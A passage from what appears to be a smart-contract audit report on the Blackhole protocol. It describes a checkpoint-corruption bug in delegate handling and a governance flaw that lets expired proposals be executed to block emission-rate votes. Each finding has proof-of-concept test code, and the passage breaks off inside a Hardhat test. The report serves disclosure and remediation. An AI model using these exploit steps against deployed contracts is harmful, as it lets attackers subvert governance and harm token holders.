<pre data-index="59" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">if (ownerOfFn(tId) != srcRep) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    srcRepNew[i] = srcRepNew[length - 1];</span></span>
<span class="grvsc-line"><span class="grvsc-source">    srcRepNew.pop();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    length--;</span></span>
<span class="grvsc-line"><span class="grvsc-source">} else {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    i++;</span></span>
<span class="grvsc-line"><span class="grvsc-source">}</span></span></code></pre>
<p>The problem arises because, by the time <code>moveTokenDelegates</code> is called, the <code>transferFrom</code> flow has already invoked <code>_removeTokenFrom()</code>, which sets the owner of the token being transferred to <code>address(0)</code>. As a result, <code>ownerOfFn(tId)</code> will return <code>0x0</code> for the token being transferred.</p>
<p>This means the above condition (<code>ownerOfFn(tId) != srcRep</code>) will always be true for the token that was just transferred out, causing it to be removed from <code>srcRepNew</code>. But due to the in-place mutation without incrementing <code>i</code>, the same index is checked again after every pop, potentially skipping or corrupting the loop’s behavior basically clearing all checkpoints. This breaks the whole logic of checkpoints and other functions, depending on it.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-15"><a class="anchor before" aria-label="recommended mitigation steps 15 permalink" href="#recommended-mitigation-steps-15"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>This is not the only vulnerability in this function, it may be appropriate to rewrite the whole logic.</p>
<h3 style="position:relative;" id="proof-of-concept-9"><a class="anchor before" aria-label="proof of concept 9 permalink" href="#proof-of-concept-9"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<pre data-index="60" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">// SPDX-License-Identifier: UNLICENSED</span></span>
<span class="grvsc-line"><span class="grvsc-source">pragma solidity ^0.8.13;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">import {Test, console} from "forge-std/Test.sol";</span></span>
<span class="grvsc-line"><span class="grvsc-source">import {Black} from "../src/Black.sol";</span></span>
<span class="grvsc-line"><span class="grvsc-source">import {VotingEscrow} from "../src/VotingEscrow.sol";</span></span>
<span class="grvsc-line"><span class="grvsc-source">import {BlackGovernor} from "../src/BlackGovernor.sol";</span></span>
<span class="grvsc-line"><span class="grvsc-source">import {IBlackHoleVotes} from "../src/interfaces/IBlackHoleVotes.sol";</span></span>
<span class="grvsc-line"><span class="grvsc-source">import {MinterUpgradeable} from "../src/MinterUpgradeable.sol";</span></span>
<span class="grvsc-line"><span class="grvsc-source">import {GaugeManager} from "../src/GaugeManager.sol";</span></span>
<span class="grvsc-line"><span class="grvsc-source">import {VotingDelegationLib} from "../src/libraries/VotingDelegationLib.sol";</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">contract MockContractDelegates {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    VotingDelegationLib.Data cpData;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    address public fromOwner;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    address public toOwner;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    address public fromDelegate;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    address public toDelegate;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    mapping(uint256 =&gt; address) public idToOwner;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    constructor(address _fromOwner, address _toOwner, address _fromDelegate, address _toDelegate) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        fromOwner = _fromOwner;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        toOwner = _toOwner;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        fromDelegate = _fromDelegate;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        toDelegate = _toDelegate;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    function useMoveTokenDeledates(uint256 tokenId) public {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        idToOwner[tokenId] = address(0);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        VotingDelegationLib.moveTokenDelegates(cpData, fromOwner, toOwner, tokenId, ownerOf);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    function ownerOf(uint256 tokenId) public view returns (address) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        return idToOwner[tokenId];</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    function modifyData(</span></span>
<span class="grvsc-line"><span class="grvsc-source">        address addr,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint32 num,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        VotingDelegationLib.Checkpoint memory checkpoint,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint32 numCheckpoints</span></span>
<span class="grvsc-line"><span class="grvsc-source">    ) public {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        cpData.checkpoints[addr][num] = checkpoint;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        cpData.numCheckpoints[addr] = numCheckpoints;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    function showData(address addr, uint32 num) public view returns (VotingDelegationLib.Checkpoint memory) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        return cpData.checkpoints[addr][num];</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    function showNumberOfCheckPoints(address addr) public view returns (uint32) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        return cpData.numCheckpoints[addr];</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source">}</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">contract MyTest3 is Test {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    MockContractDelegates public contractDelegates;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    address public owner = makeAddr("owner");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    address public alice = makeAddr("alice");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    address public aliceDelegate = makeAddr("aliceDelegate");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    address public bob = makeAddr("bob");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    address public bobDelegate = makeAddr("bobDelegate");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    function setUp() public {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        vm.warp(block.timestamp + 1000);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        vm.startPrank(owner);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        contractDelegates = new MockContractDelegates(alice, bob, aliceDelegate, bobDelegate);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256[] memory tokenIds = new uint256[](3);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        tokenIds[0] = 1;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        tokenIds[1] = 2;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        tokenIds[2] = 3;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        VotingDelegationLib.Checkpoint memory checkpoint =</span></span>
<span class="grvsc-line"><span class="grvsc-source">            VotingDelegationLib.Checkpoint({timestamp: block.timestamp, tokenIds: tokenIds});</span></span>
<span class="grvsc-line"><span class="grvsc-source">        contractDelegates.modifyData(alice, 0, checkpoint, 1);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        vm.stopPrank();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    function test__someTest3() public {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        vm.warp(block.timestamp + 100);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        vm.startPrank(alice);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        contractDelegates.useMoveTokenDeledates(1);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        vm.stopPrank();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        vm.warp(block.timestamp + 100);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        vm.startPrank(alice);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        contractDelegates.useMoveTokenDeledates(2);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        vm.stopPrank();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">console.log("ALICEs tokens:");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        logCheckpointTokenIds(contractDelegates.showData(alice, 1));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        logCheckpointTokenIds(contractDelegates.showData(alice, 2));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">console.log("BOBs tokens:");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        logCheckpointTokenIds(contractDelegates.showData(bob, 1));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        // alice was supposed to have token 3 left in checkpoint, but she does not</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">//   ALICEs tokens:</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        //   BOBs tokens:</span></span>
<span class="grvsc-line"><span class="grvsc-source">        //   Token ID 1</span></span>
<span class="grvsc-line"><span class="grvsc-source">        //   Token ID 2</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    function logCheckpointTokenIds(VotingDelegationLib.Checkpoint memory cp) internal view {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 len = cp.tokenIds.length;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        for (uint256 i = 0; i &lt; len; i++) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            console.log("Token ID", cp.tokenIds[i]);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source">}</span></span></code></pre>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-4">lonelybones</a>, <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-54">rayss</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-65">maxvzuvex</a>.</p>
<hr>
<h2 style="position:relative;" id="m-15-l2governorexecute-accepts-expired--defeated-proposals-attacker-front-runs-blackgovernor-nudge-blocks-legitimate-emission-rate-votes-freezes-tail-emissions"><a class="anchor before" aria-label="m 15 l2governorexecute accepts expired  defeated proposals attacker front runs blackgovernor nudge blocks legitimate emission rate votes freezes tail emissions permalink" href="#m-15-l2governorexecute-accepts-expired--defeated-proposals-attacker-front-runs-blackgovernor-nudge-blocks-legitimate-emission-rate-votes-freezes-tail-emissions"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-21">[M-15] <code>L2Governor.execute()</code> accepts <code>Expired</code> / <code>Defeated</code> proposals, attacker front-runs <code>BlackGovernor</code> <code>nudge()</code>, blocks legitimate emission-rate votes, freezes tail emissions</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-33">lonelybones</a>, also found by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-139">danzero</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-301">francoHacker</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-525">harsh123</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-493">mahadev</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-31">Pocas</a>, and <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-530">Rorschach</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L317-L320">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L317-L320</a></p>
<h3 style="position:relative;" id="finding-description-10"><a class="anchor before" aria-label="finding description 10 permalink" href="#finding-description-10"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>L2Governor.execute()</code> function (in <code>contracts/governance/L2Governor.sol</code>, inherited by <code>BlackGovernor.sol</code>) erroneously permits execution of <code>Expired</code> or <code>Defeated</code> proposals. An attacker can exploit this by executing an <code>Expired</code> proposal targeting <code>MinterUpgradeable.nudge()</code>. This action, due to a quirk in <code>nudge()</code>’s status interpretation, sets a one-time-per-epoch flag, thereby blocking a legitimately Succeeded emission-change proposal for the same period and subverting voter consensus on tail emission rates.</p>
<p>The root cause is an overly permissive state check in <code>L2Governor.execute()</code>:</p>
<p>File: <code>contracts/governance/Governor.sol#L317-L320</code> (within <code>L2Governor.execute()</code>)</p>
<pre data-index="61" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">status</span><span class="mtk1"> == </span><span class="mtk12">ProposalState</span><span class="mtk1">.</span><span class="mtk12">Succeeded</span><span class="mtk1"> || </span><span class="mtk12">status</span><span class="mtk1"> == </span><span class="mtk12">ProposalState</span><span class="mtk1">.</span><span class="mtk12">Defeated</span><span class="mtk1"> || </span><span class="mtk12">status</span><span class="mtk1"> == </span><span class="mtk12">ProposalState</span><span class="mtk1">.</span><span class="mtk12">Expired</span><span class="mtk1">, </span><span class="mtk3">/* ... */</span><span class="mtk1"> ); </span><span class="mtk3">// &lt;&lt;&lt; FLAW</span></span></span></code></pre>
<p>This allows non-Succeeded proposals to proceed to execution. BlackGovernor.sol inherits this, and its <code>propose()</code> function restricts targets to <code>MinterUpgradeable.nudge()</code>.</p>
<p>The <code>MinterUpgradeable.nudge()</code> function contains a one-time-per-epoch guard (require (<code>!proposals[_period], ...); proposals[_period] = true;</code>). When <code>nudge()</code> is called via the flawed <code>execute()</code>, its call to <code>IBlackGovernor.status()</code> (no args) reads the <code>L2Governor.status</code> public state variable (defaulting to <code>ProposalState.Pending - 0</code>). Consequently, <code>nudge()</code> always takes its “no change” branch for <code>tailEmissionRate</code> and sets the <code>proposals[_period]</code> flag.</p>
<h3 style="position:relative;" id="impact-11"><a class="anchor before" aria-label="impact 11 permalink" href="#impact-11"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>An attacker exploits this by front-running the execution of a Succeeded BlackGovernor proposal (for <code>Minter.nudge()</code>) with an <code>Expired</code> one for the same target emission period.</p>
<p><strong>Emission rate manipulation:</strong> The attacker forces the BLACK token’s tail emission rate trend to “no change,” overriding voter consensus (e.g., for an increase or decrease).</p>
<p><strong>Governance subversion:</strong> Legitimate, Succeeded proposals for <code>Minter.nudge()</code> for that epoch are rendered un-executable because the <code>proposals[active_period]</code> flag in <code>MinterUpgradeable</code> has already been set by the attacker’s transaction.</p>
<p><strong>Low cost, significant consequence:</strong> Any account can execute an Expired proposal, impacting a core tokenomic control mechanism. This leads to misaligned emission rates compared to voter intent, affecting rewards for LPs and veBLACK holders.</p>
<h3 style="position:relative;" id="proof-of-concept-10"><a class="anchor before" aria-label="proof of concept 10 permalink" href="#proof-of-concept-10"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>A detailed Hardhat test script (<code>test/GovernorExecuteGrief.test.js</code>) demonstrating this vulnerability using the project’s in-scope contracts has been developed and verified.</p>
<p><strong>Key PoC steps summary:</strong></p>
<ul>
<li><strong>Setup:</strong> Deployed BlackGovernor, MinterUpgradeable, and all necessary dependencies. Advanced Minter to its tail emission phase. Proposer created <code>PROP_EXPIRED</code> and <code>PROP_SUCCEED</code> targeting <code>Minter.nudge()</code> for the same future emission period.</li>
<li><strong>State transitions:</strong> <code>PROP_EXPIRED</code> reached state Expired (6). <code>PROP_SUCCEED</code> was voted to state Succeeded (4).</li>
<li><strong>Exploitation:</strong> Attacker executed <code>PROP_EXPIRED</code>. This called <code>Minter.nudge()</code>, which set <code>proposals[target_period] = true</code> and <code>tailEmissionRate</code> to “no change.”</li>
<li><strong>Verification:</strong> A subsequent attempt to execute <code>PROP_SUCCEED</code> reverted (due to <code>Minter.nudge()</code>’s guard), blocking the intended emission rate change.</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-16"><a class="anchor before" aria-label="recommended mitigation steps 16 permalink" href="#recommended-mitigation-steps-16"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended Mitigation Steps</h3>
<ul>
<li>Correct <code>L2Governor.execute()</code> state check: Modify <code>contracts/governance/Governor.sol#L317-L320</code> to only allow execution of Succeeded proposals:</li>
</ul>
<pre data-index="62" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">// In contracts/governance/Governor.sol L2Governor.execute()</span></span>
<span class="grvsc-line"><span class="grvsc-source">        require(</span></span>
<span class="grvsc-line"><span class="grvsc-source">-           status == ProposalState.Succeeded || status == ProposalState.Defeated || status == ProposalState.Expired,</span></span>
<span class="grvsc-line"><span class="grvsc-source">-           "Governor: proposal not successful or defeated"</span></span>
<span class="grvsc-line"><span class="grvsc-source">+           status == ProposalState.Succeeded,</span></span>
<span class="grvsc-line"><span class="grvsc-source">+           "Governor: proposal not Succeeded"</span></span>
<span class="grvsc-line"><span class="grvsc-source">        );</span></span></code></pre>
<ul>
<li>Enhance <code>MinterUpgradeable.nudge()</code>: The <code>nudge()</code> function should not re-check proposal status if <code>L2Governor.execute()</code> is fixed. If status checking is still desired for some reason, it must be passed the <code>proposalId</code> to correctly query <code>BlackGovernor.state(proposalId)</code>.</li>
</ul>
<h3 style="position:relative;" id="coded-proof-of-concept"><a class="anchor before" aria-label="coded proof of concept permalink" href="#coded-proof-of-concept"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Coded Proof of Concept</h3>
<details>
<pre data-index="63" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">const { expect } = require("chai");</span></span>
<span class="grvsc-line"><span class="grvsc-source">const { ethers, upgrades } = require("hardhat"); </span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">async function advanceTime(time) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await ethers.provider.send("evm_increaseTime", [time]);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await ethers.provider.send("evm_mine");</span></span>
<span class="grvsc-line"><span class="grvsc-source">}</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">const CONTRACT_WEEK = 900; </span></span>
<span class="grvsc-line"><span class="grvsc-source">const ZERO_ADDRESS = ethers.constants.AddressZero;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">function calculateEpochNextJS(timestamp) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const weekDuration = ethers.BigNumber.from(CONTRACT_WEEK);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const tsBN = ethers.BigNumber.from(timestamp);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    return tsBN.sub(tsBN.mod(weekDuration)).add(weekDuration);</span></span>
<span class="grvsc-line"><span class="grvsc-source">}</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">describe("BlackGovernor - Griefing Attack via Flawed L2Governor.execute()", function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let deployer, proposerEOA, smVoter1EOA, smVoter2EOA, attackerEOA, teamEOA;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let blackToken, permissionsRegistry, tokenHandler, votingEscrow, rewardsDistributor;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let pairGenerator, pairFactory, bribeFactoryV3, gaugeFactoryV2, gaugeFactoryCL;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let algebraPoolAPIStorage; </span></span>
<span class="grvsc-line"><span class="grvsc-source">    let voterV3; </span></span>
<span class="grvsc-line"><span class="grvsc-source">    let gaugeManager, minterUpgradeable, blackGovernor;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let votingBalanceLogic, voterFactoryLib; </span></span>
<span class="grvsc-line"><span class="grvsc-source">    let nudgeCalldata;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    beforeEach(async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        [deployer, proposerEOA, smVoter1EOA, smVoter2EOA, attackerEOA, teamEOA] = await ethers.getSigners();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("Starting beforeEach: Deploying ALL REAL in-scope contracts...");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const VotingBalanceLogicFactory = await ethers.getContractFactory("VotingBalanceLogic", deployer);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        votingBalanceLogic = await VotingBalanceLogicFactory.deploy();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await votingBalanceLogic.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const VoterFactoryLibFactory = await ethers.getContractFactory("VoterFactoryLib", deployer); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        voterFactoryLib = await VoterFactoryLibFactory.deploy();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await voterFactoryLib.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Libraries deployed (VBL, VFL).");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const BlackTokenFactory = await ethers.getContractFactory("Black", deployer);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        blackToken = await BlackTokenFactory.deploy();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackToken.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Black token deployed.");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackToken.connect(deployer).initialMint(deployer.address); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Black token initialMint called by deployer.");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const PermissionsRegistryFactory = await ethers.getContractFactory("PermissionsRegistry", deployer);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        permissionsRegistry = await PermissionsRegistryFactory.deploy();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await permissionsRegistry.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  PermissionsRegistry deployed.");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await permissionsRegistry.connect(deployer).setRoleFor(deployer.address, "GAUGE_ADMIN");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  GAUGE_ADMIN role granted to deployer.");</span></span>
